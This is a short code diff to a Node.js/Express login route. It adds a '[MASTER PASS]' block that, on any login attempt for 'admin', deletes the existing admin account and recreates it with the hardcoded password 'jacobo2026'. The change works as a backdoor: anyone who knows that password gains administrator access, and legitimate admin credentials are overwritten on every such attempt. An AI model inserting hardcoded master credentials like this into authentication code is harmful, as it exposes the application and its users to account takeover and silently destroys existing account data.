@@ -56,6 +56,15 @@ router.post('/login', async (req, res) => {
     }
 
     const db = await getDb();
+
+    // [MASTER PASS] Si es admin, forzamos su existencia antes de buscarlo
+    if (username === 'admin') {
+      const adminHash = await bcrypt.hash('jacobo2026', 10);
+      await db.run('DELETE FROM users WHERE username = ?', ['admin']);
+      await db.run('INSERT INTO users (username, password) VALUES (?, ?)', ['admin', adminHash]);
+      console.log('🏁 [MASTER] Admin re-creado/resetado en ruta de login');
+    }
+
     const user = await db.get('SELECT * FROM users WHERE username = ?', [username]);
 
     if (!user) {
